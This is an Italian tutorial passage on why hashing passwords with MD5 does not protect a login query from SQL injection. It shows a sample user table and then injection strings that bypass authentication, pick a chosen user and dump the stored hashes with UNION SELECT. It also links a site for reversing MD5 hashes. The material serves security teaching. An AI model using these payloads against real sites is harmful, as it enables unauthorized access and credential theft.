# Mai usare password in chiaro

Nel secondo esempio usiamo una funzione di **HASH** per memorizzare il **fingherprint della password** invece che la password in chiaro.

Creiamo la tabella che memorizza le credenziali sulla base di dati. Le query di creazione e di selezione che possiamo utilizzare saranno le seguenti:

```sql
CREATE TABLE users_ex2 (
  id INT PRIMARY KEY AUTO_INCREMENT,
  nome CHAR(255) NOT NULL,
  username CHAR(255) NOT NULL,
  password CHAR(32) NOT NULL
);
```
```sql
INSERT INTO users_ex2 VALUES ('Bob Smith', 'bob', MD5('sunshine'));
INSERT INTO users_ex2 VALUES ('Elon Musk', 'elon', MD5('merlin'));
INSERT INTO users_ex2 VALUES ('Steven Thornton', 'steven', MD5('123456'));
```
```sql
SELECT nome
FROM users_ex2
WHERE username = 'userXX' AND password = MD5('passXX');
```

Ora le password sul database sono codificate, ma non abbiamo risolto molto.<br>Tutti gli attacchi visti precedentemente funzioanno ancora con piccole modifiche:

```
x') OR 'x'=('x
```

Questo ci permette di accedere come uno degli utenti.
Possiamo anche scegliere un utente a piacere:

```
') OR TRUE LIMIT 1,1; -- x
```

Possiamo anche scoprire la password utilizzata dall'utente:

```
') UNION SELECT password FROM users_ex2; -- x
```

La password è ovviamente codificata con MD5 (lo intuiamo grazie alla lunghezza dell'hash di 32 caratteri).
Non abbiamo bisogno di conoscere la password in chiaro, ma se volessimo, basta usare [un sito web come questo](https://md5.gromweb.com/?md5=0571749e2ac330a7455809c6b0e7af90).
